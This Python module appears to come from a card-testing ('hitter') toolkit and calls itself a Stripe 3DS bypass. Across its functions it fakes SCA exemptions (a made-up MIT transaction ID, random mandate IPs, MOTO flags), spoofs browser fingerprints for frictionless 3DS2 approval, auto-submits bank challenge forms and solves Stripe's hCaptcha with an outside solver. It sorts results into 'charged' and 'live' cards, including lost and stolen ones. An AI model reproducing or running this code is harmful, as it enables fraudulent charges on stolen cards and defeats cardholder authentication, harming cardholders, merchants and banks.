"""
Stripe 3DS Bypass Module — Advanced SCA/3DS authentication bypass utilities.
Ported from Hitchk-Workflow stripe_co.py.

All functions use curl_cffi sessions (matching the hitter's existing stack).
These are called as fast-path attempts AROUND the friend's 3DS handler, never replacing it.
"""
import re
import json
import time
import random
import string
import asyncio
import base64
import logging
from typing import Optional, Tuple, Dict

logger = logging.getLogger(__name__)

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"  # Friend's mobile profile
STRIPE_API = "https://api.stripe.com/v1"

LIVE_DECLINE_CODES = [
    "insufficient_funds", "lost_card", "stolen_card", "do_not_honor",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
]


def _random_guid():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))


def _classify_error(error_data):
    """Classify a Stripe error into (status, message) tuple."""
    code = error_data.get("code", "")
    decline = error_data.get("decline_code", "")
    msg = error_data.get("message", "")

    if code == "card_declined" and decline:
        if decline in LIVE_DECLINE_CODES:
            return "live_declined", decline
        return "declined", decline
    if code == "card_declined":
        return "declined", "card_declined"
    if code in ("expired_card", "incorrect_cvc", "incorrect_zip", "invalid_cvc"):
        return "declined", code
    return "declined", f"{code}: {msg[:60]}"


def _build_js_headers(passed_headers, content_type="application/x-www-form-urlencoded"):
    # Always use friend's mobile UA for 3DS authenticate — mismatched UA = challenge trigger
    headers = {
        "User-Agent": UA,  # Friend's Android/Chrome 120 Mobile UA (fixed)
        "Content-Type": content_type,
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }
    # Propagate client hints if present in passed_headers
    for key in ["sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"]:
        val = (passed_headers or {}).get(key)
        if val:
            headers[key] = val
    return headers


# ============= PRE-3DS FAST PATH: RE-CONFIRM WITH SCA EXEMPTIONS =============

async def attempt_reconfirm_bypass(loop, session, pk, intent_id, client_secret, pm_id, intent_type, headers):
    """
    Try re-confirming the payment intent with various SCA exemption parameters.
    If any succeeds or returns a definitive decline, return (status, message).
    Returns None if all attempts fail (caller should proceed to normal 3DS).
    """
    if intent_type == "setup_intent":
        endpoint = f"{STRIPE_API}/setup_intents/{intent_id}/confirm"
    else:
        endpoint = f"{STRIPE_API}/payment_intents/{intent_id}/confirm"

    bypass_attempts = [
        # Attempt 1: request_three_d_secure=automatic + setup_future_usage
        {
            "client_secret": client_secret,
            "payment_method": pm_id,
            "payment_method_options[card][request_three_d_secure]": "automatic",
            "payment_method_options[card][setup_future_usage]": "off_session",
            "error_on_requires_action": "true",
            "key": pk,
        },
        # Attempt 2: MIT exemption with fake network transaction ID
        {
            "client_secret": client_secret,
            "payment_method": pm_id,
            "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
            "payment_method_options[card][mit_exemption][network_transaction_id]": _random_guid()[:15],
            "error_on_requires_action": "true",
            "key": pk,
        },
        # Attempt 3: Online mandate acceptance
        {
            "client_secret": client_secret,
            "payment_method": pm_id,
            "mandate_data[customer_acceptance][type]": "online",
            "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "mandate_data[customer_acceptance][online][user_agent]": (headers or {}).get("user-agent") or (headers or {}).get("User-Agent") or UA,
            "error_on_requires_action": "true",
            "key": pk,
        },
        # Attempt 4: request_three_d_secure=automatic
        {
            "client_secret": client_secret,
            "payment_method": pm_id,
            "payment_method_options[card][request_three_d_secure]": "automatic",
            "error_on_requires_action": "true",
            "key": pk,
        },
        # Attempt 5: MOTO (Mail Order / Telephone Order)
        {
            "client_secret": client_secret,
            "payment_method": pm_id,
            "payment_method_options[card][moto]": "true",
            "error_on_requires_action": "true",
            "key": pk,
        },
    ]

    for i, attempt_data in enumerate(bypass_attempts):
        try:
            logger.info(f"3DS reconfirm bypass attempt {i+1}/{len(bypass_attempts)}...")
            resp = await loop.run_in_executor(None, lambda ad=attempt_data: session.post(
                endpoint, data=ad, headers=headers, timeout=20))
            data = resp.json()

            if "error" in data:
                err = data["error"]
                err_code = err.get("code", "")
                err_msg = err.get("message", "")
                err_decline = err.get("decline_code", "")

                # Checkout-created PI cannot be re-confirmed directly
                if "created by Checkout" in err_msg:
                    logger.info("Detected Checkout-created PI, skipping re-confirm attempts")
                    return None

                # Card declined with decline code = definitive result
                if err_code == "card_declined" and err_decline:
                    if err_decline in LIVE_DECLINE_CODES:
                        return "live_declined", f"{err_decline} (3DS Bypassed)"
                    return "declined", f"{err_decline} (3DS Bypassed)"

                if err_code == "authentication_required":
                    continue  # Expected — try next variation

                if err_code == "card_declined":
                    return "declined", "card_declined (3DS Bypassed)"

                if "expired" in err_msg.lower() or "completed" in err_msg.lower():
                    return "error", "Intent expired"

                if err_code in ("payment_intent_unexpected_state", "setup_intent_unexpected_state"):
                    break  # Stop trying

                continue

            status = data.get("status", "")
            if status == "succeeded":
                return "charged", "Charged (3DS Bypassed)"
            if status == "requires_capture":
                return "charged", "Authorized (3DS Bypassed)"
            if status == "processing":
                return "approved", "Processing (3DS Bypassed)"
            if status == "requires_payment_method":
                error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
                last_error = data.get(error_key, {})
                if last_error:
                    s, m = _classify_error(last_error)
                    return s, f"{m} (3DS Bypassed)"
                return "declined", "Payment method failed (3DS Bypassed)"
            if status == "requires_action":
                continue

        except Exception as e:
            logger.warning(f"3DS reconfirm bypass {i+1} exception: {e}")
            continue

    return None  # All attempts failed — fall through to friend's 3DS code


# ============= 3DS2 FRICTIONLESS AUTHENTICATE =============

async def attempt_3ds2_frictionless(loop, session, pk, client_secret, intent_id, intent_type, source_id, sdk_data, headers):
    """
    Perform 3DS2 fingerprint + authenticate with multiple browser variations.
    Returns (status, message) on success/decline, or None to fall through.
    """
    server_tx_id = sdk_data.get("server_transaction_id", "")
    three_ds_method_url = sdk_data.get("three_ds_method_url", "")

    if not source_id:
        return None

    # Step 1: 3DS Method URL fingerprint
    fingerprint_data = ""
    fingerprint_success = False
    if three_ds_method_url and server_tx_id:
        try:
            method_payload = base64.b64encode(
                json.dumps({"threeDSServerTransID": server_tx_id}).encode()
            ).decode().rstrip("=")
            logger.info("3DS2: POSTing to threeDSMethodURL...")
            method_resp = await loop.run_in_executor(None, lambda: session.post(
                three_ds_method_url,
                data={"threeDSMethodData": method_payload},
                headers={
                    "User-Agent": UA,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                },
                timeout=15))
            fingerprint_data = method_payload
            fingerprint_success = method_resp.status_code < 400
        except Exception as e:
            logger.warning(f"3DS2: method URL failed: {e}")

    await asyncio.sleep(random.uniform(2.0, 3.5))

    tz_offset = "-300"  # Friend's fixed EST timezone

    # Build authenticate variations
    auth_variations = []

    if fingerprint_success:
        auth_variations.append({
            "fingerprintAttempted": True,
            "fingerprintData": fingerprint_data,
            "challengeWindowSize": "05",
            "threeDSCompInd": "Y",
        })

    auth_variations.append({
        "fingerprintAttempted": True,
        "fingerprintData": fingerprint_data if fingerprint_data else "",
        "challengeWindowSize": "05",
        "threeDSCompInd": "Y" if three_ds_method_url else "U",
    })

    auth_variations.append({
        "fingerprintAttempted": not three_ds_method_url,
        "fingerprintData": "",
        "challengeWindowSize": "05",
        "threeDSCompInd": "U",
    })

    js_headers = _build_js_headers(headers)

    for var_idx, var_data in enumerate(auth_variations):
        browser_data = json.dumps({
            **var_data,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserScreenHeight": "873",   # Friend's mobile portrait
            "browserScreenWidth": "393",    # Friend's mobile portrait
            "browserTZ": tz_offset,
            "browserUserAgent": js_headers["User-Agent"],
        })

        auth_data = {
            "source": source_id,
            "browser": browser_data,
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "false",
            "one_click_authn_device_support[webauthn_eligible]": "false",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": pk,
        }

        try:
            logger.info(f"3DS2: frictionless attempt {var_idx+1}/{len(auth_variations)} (comp={var_data['threeDSCompInd']})...")
            auth_resp = await loop.run_in_executor(None, lambda ad=auth_data: session.post(
                f"{STRIPE_API}/3ds2/authenticate", data=ad, headers=js_headers, timeout=25))
            auth_result = auth_resp.json()
        except Exception as e:
            logger.warning(f"3DS2: attempt {var_idx+1} failed: {e}")
            continue

        if auth_result and not auth_result.get("error"):
            ares = auth_result.get("ares") or {}
            trans_status = ares.get("transStatus", "")
            logger.info(f"3DS2: attempt {var_idx+1} transStatus={trans_status}")

            if trans_status in ("Y", "A"):
                logger.info("3DS2: frictionless approval!")
                await asyncio.sleep(2)
                poll_result = await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, js_headers)
                if poll_result:
                    return poll_result
                return "charged", "Charged (3DS2 Frictionless)"

            if trans_status == "C":
                logger.info("3DS2: challenge required from frictionless attempt")
                acs_url = ares.get("acsURL", "")
                creq = auth_result.get("creq", "")
                acs_trans_id = ares.get("acsTransID", "")
                tds2_id = auth_result.get("id", "")

                if acs_url and creq:
                    challenge_result = await attempt_3ds2_challenge(
                        loop, session, pk, client_secret, intent_id, intent_type,
                        acs_url, creq, source_id, js_headers
                    )
                    if challenge_result:
                        return challenge_result
                break

            if trans_status in ("R", "N"):
                logger.info(f"3DS2: authentication rejected (transStatus={trans_status})")
                await asyncio.sleep(2)
                poll_result = await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, js_headers)
                if poll_result:
                    return poll_result
                break

            if trans_status:
                await asyncio.sleep(2)
                poll_result = await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, js_headers)
                if poll_result:
                    return poll_result
                continue
        else:
            err_msg = ""
            if auth_result and auth_result.get("error"):
                err_msg = auth_result["error"].get("message", "")

            if "not supported" in err_msg.lower() or "source you supplied is invalid" in err_msg.lower():
                break

            if "already been consumed" in err_msg.lower():
                await asyncio.sleep(1)
                poll_result = await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, js_headers)
                if poll_result:
                    return poll_result
                break

            continue

    return None


# ============= 3DS2 CHALLENGE AUTO-SOLVER =============

async def attempt_3ds2_challenge(loop, session, pk, client_secret, intent_id, intent_type, acs_url, creq, source_id, headers):
    """
    Auto-post creq to ACS URL, extract cres, complete challenge on Stripe.
    Returns (status, message) on success, or None if challenge requires user interaction.
    """
    try:
        logger.info(f"3DS2 challenge: POSTing creq to ACS ({acs_url[:60]}...)")
        acs_origin = acs_url.split("/")[0] + "//" + acs_url.split("/")[2] if "/" in acs_url else ""
        acs_resp = await loop.run_in_executor(None, lambda: session.post(
            acs_url,
            data={"creq": creq},
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": acs_origin,
            },
            timeout=20,
            allow_redirects=True))
        acs_body = acs_resp.text
        acs_final_url = str(acs_resp.url)

        # Check if ACS auto-redirected to return URL (auto-approved)
        if "return_url" in acs_final_url or "stripe.com" in acs_final_url:
            logger.info("3DS2 challenge: ACS redirected to return URL (auto-approved)")
            await asyncio.sleep(1)
            return await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers)

        # Try to extract cres from ACS response
        cres_match = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\']+)', acs_body, re.I)
        if not cres_match:
            cres_match = re.search(r'name=["\']?cres["\']?[^>]*value=["\']([A-Za-z0-9+/=]{20,})', acs_body, re.I)
        if not cres_match:
            cres_match = re.search(r'value=["\']([A-Za-z0-9+/=]{50,})["\']', acs_body)

        if cres_match:
            cres = cres_match.group(1)
            logger.info(f"3DS2 challenge: extracted cres ({len(cres)} chars)")

            # Complete the challenge on Stripe
            complete_data = {"source": source_id, "key": pk}
            await loop.run_in_executor(None, lambda: session.post(
                f"{STRIPE_API}/3ds2/challenge/complete", data=complete_data, headers=headers, timeout=20))

            await asyncio.sleep(2)
            result = await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers)
            if result:
                return result

        # Check for transStatus in ACS response body
        trans_status_input = re.search(r'transStatus["\s:=]+["\']?([YNACU])', acs_body)
        if trans_status_input:
            ts = trans_status_input.group(1)
            if ts in ("Y", "A"):
                await asyncio.sleep(2)
                return await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers)

        # Try auto-submitting any form found in ACS response
        form_action = re.search(r'<form[^>]*action=["\']([^"\']+)', acs_body, re.I)
        hidden_inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)', acs_body, re.I)
        if form_action and hidden_inputs:
            action_url = form_action.group(1)
            if not action_url.startswith("http"):
                from urllib.parse import urljoin
                action_url = urljoin(str(acs_resp.url), action_url)
            form_data = {name: value for name, value in hidden_inputs}
            logger.info(f"3DS2 challenge: auto-submitting ACS form to {action_url[:60]}...")
            form_resp = await loop.run_in_executor(None, lambda: session.post(
                action_url, data=form_data,
                headers=_build_js_headers(headers),
                allow_redirects=True, timeout=20))
            form_body = form_resp.text
            form_final = str(form_resp.url)

            if "return_url" in form_final or "stripe.com" in form_final:
                await asyncio.sleep(1)
                return await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers)

            cres2 = re.search(r'name=["\']?cres["\']?[^>]*value=["\']([A-Za-z0-9+/=]{20,})', form_body, re.I)
            if cres2:
                complete_data2 = {"source": source_id, "key": pk}
                await loop.run_in_executor(None, lambda: session.post(
                    f"{STRIPE_API}/3ds2/challenge/complete", data=complete_data2, headers=headers, timeout=20))
                await asyncio.sleep(2)
                result2 = await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers)
                if result2:
                    return result2

        logger.info("3DS2 challenge: could not auto-complete (requires user interaction)")

    except Exception as e:
        logger.warning(f"3DS2 challenge error: {e}")

    return None


# ============= 3DS1 REDIRECT FLOW =============

async def attempt_3ds1_redirect(loop, session, pk, client_secret, intent_id, intent_type, redirect_url, headers):
    """Follow 3DS1 redirect chain and try to auto-submit."""
    try:
        logger.info(f"3DS1: following redirect to {redirect_url[:60]}...")
        resp = await loop.run_in_executor(None, lambda: session.get(
            redirect_url,
            headers={
                "User-Agent": (headers or {}).get("user-agent") or (headers or {}).get("User-Agent") or UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none"
            },
            allow_redirects=True, timeout=20))
        body = resp.text
        final_url = str(resp.url)

        if "return_url" in final_url or "stripe.com" in final_url:
            await asyncio.sleep(1)
            return await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers)

        # Auto-submit any forms
        form_action = re.search(r'<form[^>]*action=["\']([^"\']+)', body, re.I)
        hidden_inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)', body, re.I)
        if form_action and hidden_inputs:
            action_url = form_action.group(1)
            if not action_url.startswith("http"):
                from urllib.parse import urljoin
                action_url = urljoin(final_url, action_url)
            form_data = {name: value for name, value in hidden_inputs}
            form_resp = await loop.run_in_executor(None, lambda: session.post(
                action_url, data=form_data,
                headers=_build_js_headers(headers),
                allow_redirects=True, timeout=20))
            form_final = str(form_resp.url)
            if "return_url" in form_final or "stripe.com" in form_final:
                await asyncio.sleep(1)
                return await poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers)

    except Exception as e:
        logger.warning(f"3DS1 redirect error: {e}")

    return None


# ============= INTENT STATUS POLL =============

async def poll_intent_status(loop, session, pk, client_secret, intent_id, intent_type, headers):
    """Poll a payment/setup intent for its final status after 3DS authentication."""
    endpoint_type = "setup_intents" if intent_type == "setup_intent" else "payment_intents"
    poll_url = f"{STRIPE_API}/{endpoint_type}/{intent_id}"
    params = {"key": pk, "client_secret": client_secret}

    for attempt in range(4):
        try:
            await asyncio.sleep(2 + attempt)
            resp = await loop.run_in_executor(None, lambda: session.get(
                poll_url, params=params, headers=headers, timeout=10))
            data = resp.json()
            status = data.get("status", "")
            logger.info(f"Intent poll {attempt+1}: status={status}")

            if status == "succeeded":
                return "charged", "Charged Successfully"
            if status == "requires_capture":
                return "charged", "Authorized (Capture Pending)"
            if status == "processing":
                return "approved", "Processing"
            if status == "canceled":
                return "declined", "Payment canceled"
            if status in ("requires_payment_method", "requires_source"):
                error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
                last_error = data.get(error_key, {})
                if last_error:
                    return _classify_error(last_error)
                return "declined", "Payment method failed"
            if status in ("requires_action", "requires_source_action"):
                continue

        except Exception as e:
            logger.warning(f"Intent poll {attempt+1} failed: {e}")

    return None


# ============= HCAPTCHA CHALLENGE HANDLER (STRIPE CHECKOUT) =============

async def attempt_captcha_verification(loop, session, pk, client_secret, intent_id, intent_type, sdk_data, headers, pm_id=None):
    """
    Handle Stripe's intent_confirmation_challenge (hCaptcha) flow.
    Solves the captcha and submits the token to Stripe's verification endpoint.
    Returns (status, message) on success, or None if solve fails.
    """
    try:
        from captcha_solver import solve_hcaptcha_enterprise, has_any_solver_key
    except ImportError:
        logger.warning("captcha_solver module not available")
        return None

    if not has_any_solver_key():
        logger.warning("No captcha API key configured, cannot solve challenge")
        return None

    stripe_js_raw = sdk_data.get("stripe_js", {})
    stripe_js_data = stripe_js_raw
    if isinstance(stripe_js_data, str):
        try:
            stripe_js_data = json.loads(stripe_js_data)
        except Exception:
            stripe_js_data = {}
    if not isinstance(stripe_js_data, dict):
        stripe_js_data = {}

    site_key = stripe_js_data.get("site_key", "")
    verification_url = stripe_js_data.get("verification_url", "")
    rqdata = stripe_js_data.get("rqdata", "")

    if not site_key or not verification_url:
        logger.info("intent_confirmation_challenge: missing site_key or verification_url")
        return None

    logger.info(f"hCaptcha detected: site_key={site_key}, verification_url={verification_url[:40]}")
    captcha_token = await solve_hcaptcha_enterprise(site_key, "https://checkout.stripe.com", rqdata=rqdata)

    if not captcha_token:
        logger.warning("hCaptcha solve returned no token")
        return None

    logger.info(f"hCaptcha solved ({len(captcha_token)} chars), submitting verification...")

    if verification_url.startswith("/v1/"):
        verify_endpoint = f"https://api.stripe.com{verification_url}"
    elif verification_url.startswith("/"):
        verify_endpoint = f"{STRIPE_API}{verification_url}"
    else:
        verify_endpoint = f"{STRIPE_API}/{verification_url}"

    verify_data = {
        "client_secret": client_secret,
        "key": pk,
        "captcha_vendor_name": "hcaptcha",
        "challenge_response_ekey": captcha_token,
    }

    js_headers = _build_js_headers(headers)

    try:
        vr = await loop.run_in_executor(None, lambda: session.post(
            verify_endpoint, data=verify_data, headers=js_headers, timeout=25))
        vr_json = vr.json()
        
        intent_obj = vr_json.get("payment_intent") or vr_json.get("setup_intent") or vr_json
        if not isinstance(intent_obj, dict):
            intent_obj = vr_json
        status = intent_obj.get("status", vr_json.get("status", ""))

        if vr.status_code == 200:
            if status == "requires_confirmation" and pm_id:
                logger.info("Captcha verified, intent requires confirmation. Confirming with pm_id...")
                confirm_url = f"{STRIPE_API}/v1/{intent_type}s/{intent_id}/confirm"
                confirm_data = {
                    "client_secret": client_secret,
                    "key": pk,
                    "payment_method": pm_id,
                    "use_stripe_sdk": "true",
                }
                cr = await loop.run_in_executor(None, lambda: session.post(
                    confirm_url, data=confirm_data, headers=js_headers, timeout=25))
                cr_json = cr.json()
                intent_obj = cr_json.get("payment_intent") or cr_json.get("setup_intent") or cr_json
                if not isinstance(intent_obj, dict):
                    intent_obj = cr_json
                status = intent_obj.get("status", "")

            if status == "succeeded":
                return "charged", "Charged (Captcha Solved)"
            if status == "requires_capture":
                return "charged", "Authorized (Captcha Solved)"
            if status == "processing":
                return "approved", "Processing"
            if status == "requires_action":
                return "requires_action", intent_obj
            if status == "requires_payment_method":
                error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
                last_error = intent_obj.get(error_key, {})
                if last_error:
                    return _classify_error(last_error)
                return "declined", "Payment method failed"
            if "error" in intent_obj:
                err = intent_obj["error"]
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                if code == "card_declined" and decline:
                    if decline in LIVE_DECLINE_CODES:
                        return "live_declined", decline
                    return "declined", decline
                if code == "card_declined":
                    return "declined", "card_declined"

        # Fallback: try with just client_secret + key
        if vr_json.get("error", {}).get("code") == "parameter_unknown":
            vr2 = await loop.run_in_executor(None, lambda: session.post(
                verify_endpoint, data={"client_secret": client_secret, "key": pk},
                headers=js_headers, timeout=20))
            vr2_json = vr2.json()
            intent2_obj = vr2_json.get("payment_intent") or vr2_json.get("setup_intent") or vr2_json
            if not isinstance(intent2_obj, dict):
                intent2_obj = vr2_json
            v2_status = intent2_obj.get("status", "")
            if v2_status == "succeeded":
                return "charged", "Charged (Captcha Solved)"
            if v2_status == "requires_capture":
                return "charged", "Authorized (Captcha Solved)"

    except Exception as e:
        logger.warning(f"Captcha verification request failed: {e}")

    return None
